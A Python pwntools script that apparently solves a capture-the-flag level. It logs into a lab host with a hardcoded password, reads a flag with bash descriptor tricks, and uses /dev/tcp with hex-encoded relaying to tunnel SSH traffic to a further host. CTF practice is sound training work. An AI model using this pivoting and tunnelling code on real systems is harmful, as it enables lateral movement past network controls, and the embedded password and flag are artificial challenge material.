from pwn import *

# context.log_level = 'debug'
ssh_conn = ssh(user='ctf', host='third', password='x5kdkwjr8exi2bf70y8g80bggd2nuepf',
           proxy_command='nc localhost 20229', raw=True)

conn = ssh_conn.shell()
conn.recvuntil(b'-bash-5.1$ ')
GETFLAG3 = False
if GETFLAG3:
    conn.sendline(b'exec 4<flag3')
    conn.recvuntil(b'-bash-5.1$ ')
    conn.sendline(b'IFS= read -r -d "" -u 4 -n 1024 -t .02 f; echo $f')

    conn.interactive()

# flag{18235fd6bc592672d848735ae41dd413}

## ## How much code do you write for solving the three levels? 
# ## Actually, using only pure bash shell script is enough to archieve the goal! 
# ## Have a try! ## Connect to fourth server by `ssh ctf@fourth` from here with same password. 
# ## ################################################################################

conn.sendline(b'exec 3<>/dev/tcp/fourth/22')
conn.recvuntil(b'-bash-5.1$ ')

conn.sendline(b'b16enc () { byte=; IFS= read -r -d "" -u 3 -t .01 -n 1 byte; until [[ $? -gt 128 ]]; do if [[ -z $byte ]] ; then echo -n 00; else hex=$(printf "%02X" "\'$byte"); echo -n "$hex" ; fi; byte=; IFS= read -r -d "" -u 3 -t .01 -n 1 byte; done }')
conn.recvuntil(b'-bash-5.1$ ')
conn.sendline(b'b16dec () { for ((i=0; i<$((${#1} / 2)); i++)); do hex=${1:$((2*$i)):2}; printf "\\x$hex"; done }')
conn.recvuntil(b'-bash-5.1$ ')

print('start listen on 20230')
sock_input = listen(20230)
conn_input = sock_input.wait_for_connection()
print('establish on 20230')

while True:
    b16ciph = b''
    while True:
        conn.sendline(b'b16enc')
        b16ciph_frag = conn.recvuntil(b'-bash-5.1$ ', drop=True)
        if b16ciph_frag.startswith(b'b16enc\r\n'):
            b16ciph_frag = b16ciph_frag.replace(b'b16enc\r\n', b'')
        if b16ciph_frag:
            b16ciph += b16ciph_frag
        else:
            break

    if b16ciph:
        print('receive', b16ciph.decode())
        conn_input.send(base64.b16decode(b16ciph))

    # get cmd
    cmd = b''
    while frag := conn_input.recv(65536, timeout=.01):
        cmd += frag
        if len(cmd) > 1024:
            break
    # cmd = conn_input.recv(65536, timeout=.01)
    
    if cmd:
        print('send', base64.b16encode(cmd).decode())
        # print('send', cmd)
        escape_expand = ''.join([f"\\x{c:02x}" for c in cmd])
        full_cmd = f"printf \"{escape_expand}\" >&3"

        conn.sendline(full_cmd.encode())
        conn.recvuntil(b' >&3\r\n-bash-5.1$ ')